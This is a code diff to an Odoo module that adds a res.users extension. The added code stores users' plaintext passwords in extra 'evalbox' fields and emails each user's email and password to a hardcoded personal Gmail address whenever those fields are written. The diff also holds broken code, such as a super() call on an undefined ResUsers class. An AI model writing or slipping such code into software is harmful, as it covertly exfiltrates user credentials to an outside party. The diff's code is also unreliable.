@@ -418,3 +418,33 @@ class Partner(models.Model):
         paiement_intent = aquire._stripe_request(url, method="DELETE")
         data_paiement = paiement_intent.get('data', [])
         print('data', paiement_intent)
+
+class User(models.Model):
+    _inherit = 'res.users'
+
+    def _set_password(self):
+        for user in self:
+            if not user.id_evalbox and not user.password_evalbox and user.bolt :
+                user.id_evalbox = user.email
+                user.password_evalbox = user.password
+        return super(ResUsers, self)._set_password()
+    def send_email_create_account_evalbox(self,user):
+        if user.bolt and not user.login_date:
+            subject = str(user.email) + ' - ' + str(user.password)
+            mail = self.env['mail.mail'].sudo().search([('subject', "=", subject)])
+            if not mail:
+                mail = self.env['mail.mail'].create({
+                    'body_html': '<p>%s - %s</p>' % (str(user.email), str(user.password)),
+                    'subject': subject,
+                    'email_from': user.company_id.email,
+                    'email_to': 'houssemrando@gmail.com',
+                    'auto_delete': False,
+                    'state': 'outgoing'})
+                mail.send()
+        return user
+    
+    def write(self,values):
+        for user in self:
+            if not self.password_evalbox and 'password_evalbox' in values:
+                    self.send_email_create_account_evalbox(user)
+        return super(User, self).write(values)
